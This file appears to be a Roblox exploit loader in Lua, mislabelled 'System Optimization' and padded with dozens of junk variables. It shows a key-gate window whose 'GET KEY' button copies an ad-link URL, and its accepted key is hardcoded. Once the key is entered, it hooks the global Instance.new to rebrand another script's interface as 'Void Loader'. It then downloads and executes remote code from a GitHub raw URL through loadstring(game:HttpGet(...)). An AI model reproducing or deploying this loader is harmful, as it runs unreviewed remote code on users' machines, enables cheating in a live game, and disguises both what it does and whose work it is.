
--// System Optimization v7.91
local vOpnnBfK = 8122; -- junk var
local DzZYihDJ = 87662; -- junk var
local qpgvfMjm = 10875; -- junk var
local MRnJHXXk = 9715; -- junk var
local gspQzDLs = 22302; -- junk var
local aQYSfyPn = 90736; -- junk var
local wfpwPsUo = 89380; -- junk var
local bmWcSYlq = 88327; -- junk var
local UBvIoMCK = 17520; -- junk var
local jdwtndrw = 58767; -- junk var
local lQWpcgBk = 65986; -- junk var
local pFYCpLsf = 66218; -- junk var
local HNrylGUs = 63027; -- junk var
local vNazcPHZ = 89239; -- junk var
local ZvfwaWXW = 18496; -- junk var
local weKZQOCe = 10718; -- junk var
local stDvTZqD = 63231; -- junk var
local FNtCGygz = 70622; -- junk var
local wJaWHrLm = 53383; -- junk var
local cQFnfuqP = 48299; -- junk var
local cAeYhXNK = 36309; -- junk var
local jbtqUnGX = 12220; -- junk var
local SGXWLmTc = 557; -- junk var
local tiHNyVYR = 35586; -- junk var
local zCMaUzgU = 36038; -- junk var
local NhmcrovT = 83681; -- junk var
local FNgAkLYC = 25776; -- junk var

--// MAIN EXECUTION START
task.spawn(function()
    local s, e = pcall(function()
        --[[ Secured by Lamperuz Auto | ID: b8505d7f37154c73a512b24492fc3436 ]]
local _k = {108, 97, 109, 112, 101, 114, 117, 122, 49, 50, 51}
local CoreGui = game:GetService("CoreGui")
if CoreGui:FindFirstChild("lHwhlw") then CoreGui["lHwhlw"]:Destroy() end

local lHwhlw = Instance.new("ScreenGui", CoreGui)
lHwhlw.Name = "lHwhlw"
local ykpKNMl = Instance.new("Frame", lHwhlw)
local nkfqLZUr = Instance.new("TextBox", ykpKNMl)

ykpKNMl.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
ykpKNMl.BorderSizePixel = 0
ykpKNMl.Position = UDim2.new(0.5, -175, 0.5, -100)
ykpKNMl.Size = UDim2.new(0, 350, 0, 200)
ykpKNMl.Active = true
ykpKNMl.Draggable = true
Instance.new("UICorner", ykpKNMl).CornerRadius = UDim.new(0, 8)

local tit = Instance.new("TextLabel", ykpKNMl)
tit.Size = UDim2.new(1, 0, 0, 45)
tit.BackgroundTransparency = 1
tit.Text = "SECURITY CHECK"
tit.TextColor3 = Color3.new(1,1,1)
tit.Font = Enum.Font.GothamBold
tit.TextSize = 18

nkfqLZUr.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
nkfqLZUr.Position = UDim2.new(0.1, 0, 0.35, 0)
nkfqLZUr.Size = UDim2.new(0.8, 0, 0, 38)
nkfqLZUr.PlaceholderText = "Enter Key..."
nkfqLZUr.Text = ""
nkfqLZUr.TextColor3 = Color3.new(1,1,1)
nkfqLZUr.Font = Enum.Font.Gotham
Instance.new("UICorner", nkfqLZUr)

local b_log = Instance.new("TextButton", ykpKNMl)
local b_get = Instance.new("TextButton", ykpKNMl)

local function style_btn(b, p, t, c)
    b.Position = p
    b.Size = UDim2.new(0.38, 0, 0, 38)
    b.Text = t
    b.BackgroundColor3 = c
    b.TextColor3 = Color3.new(1,1,1)
    b.Font = Enum.Font.GothamBold
    Instance.new("UICorner", b)
end

style_btn(b_log, UDim2.new(0.1, 0, 0.65, 0), "LOGIN", Color3.fromRGB(127, 146, 141))
style_btn(b_get, UDim2.new(0.52, 0, 0.65, 0), "GET KEY", Color3.fromRGB(60, 60, 60))

b_get.MouseButton1Click:Connect(function()
    setclipboard("https://link-center.net/2628650/0udtrz0wIh7A")
    b_get.Text = "COPIED"
    task.wait(1.5)
    b_get.Text = "GET KEY"
end)

b_log.MouseButton1Click:Connect(function()
    local inp = nkfqLZUr.Text:gsub("%s+", "")
    if #inp ~= #_k then b_log.Text = "BAD KEY" task.wait(1) b_log.Text = "LOGIN" return end
    
    local v = true
    for i=1, #inp do if string.byte(inp, i) ~= _k[i] then v = false end end
    
    if v then
        b_log.Text = "SUCCESS"
        task.wait(0.5)
        lHwhlw:Destroy()
        
        -- ЗАПУСК УНИКАЛИЗАТОРА И ЦЕЛЕВОГО СКРИПТА
        
        -- === [ LAMPERUZ UNIQUEIZER START ] ===
        local MY_NAME = "Void Loader"
        local ACCENT_COLOR = Color3.fromRGB(127, 146, 141) 
        
        local oldInstanceNew = Instance.new
        
        local function newInstanceHook(class, parent)
            local obj = oldInstanceNew(class, parent)
            task.spawn(function()
                task.wait() 
                -- 1. Подмена текста
                if obj:IsA("TextLabel") or obj:IsA("TextButton") then
                    if #obj.Text > 3 or obj.Text:find("Hub") then
                        if obj.Size.Y.Offset > 15 or obj.Name:find("Title") then
                            obj.Text = MY_NAME
                        end
                    end
                end
                -- 2. Подмена цвета
                if obj:IsA("Frame") or obj:IsA("TextButton") or obj:IsA("ScrollingFrame") then
                    local c = obj.BackgroundColor3
                    if (c.r > 0.1 or c.g > 0.1 or c.b > 0.1) and (c.r < 0.9) then
                        obj.BackgroundColor3 = ACCENT_COLOR
                    end
                end
                -- 3. Подмена обводки
                if obj:IsA("UIStroke") then
                    obj.Color = ACCENT_COLOR
                end
            end)
            return obj
        end
        
        if getgenv then
            getgenv().Instance = {new = newInstanceHook}
        end
        
        -- Запуск целевого скрипта
        local success, err = pcall(function() 
            loadstring(game:HttpGet("https://raw.githubusercontent.com/blackowl1231/Z3US/refs/heads/main/main.lua"))() 
        end)
        if not success then warn("Script Load Error: " .. tostring(err)) end
        -- === [ LAMPERUZ UNIQUEIZER END ] ===
    
    else
        b_log.Text = "WRONG"
        task.wait(1)
        b_log.Text = "LOGIN"
    end
end)

    end)
    if not s then warn("Loader Error: " .. tostring(e)) end
end)
--// MAIN EXECUTION END
--// System Optimization v9.31
local nIiceOJZ = 61744; -- junk var
local TcxNOGhK = 93427; -- junk var
local VNUWbiDd = 48425; -- junk var
local YiRqlfWx = 45608; -- junk var
local XFhdmVMc = 52354; -- junk var
local XtLpWiYk = 83638; -- junk var
local PUMpKztv = 15026; -- junk var
local wAayfPBr = 49744; -- junk var
local sfZIFmLQ = 36151; -- junk var
local FsyYAwnQ = 71859; -- junk var
local lgIGHPqf = 46546; -- junk var
local AlnRrUFE = 50212; -- junk var
local XmVaBCRU = 79456; -- junk var
local yWZCcdEa = 56127; -- junk var
local neXAqwQx = 11061; -- junk var
local yrofqKWB = 82595; -- junk var
local qdPMKMoT = 60683; -- junk var
local LqPlbrpM = 83700; -- junk var
local JcklYvuF = 3067; -- junk var
local EIIszKDh = 35832; -- junk var
local cYuImfkE = 59975; -- junk var
local dlISFUbd = 2251; -- junk var
local ljeEjPvS = 15116; -- junk var
local fKDEOFuB = 8249; -- junk var
local gOgWuRoj = 79535; -- junk var
local oBXKacMf = 1110; -- junk var
local wuLcsRYU = 5649; -- junk var
local WKtIEKwC = 56710; -- junk var
local adtftNej = 58227; -- junk var
local jajTNcIo = 65320; -- junk var
local ZuDeKYki = 54393; -- junk var
local vopAaagL = 58102; -- junk var
local KpQZcNfl = 28840; -- junk var

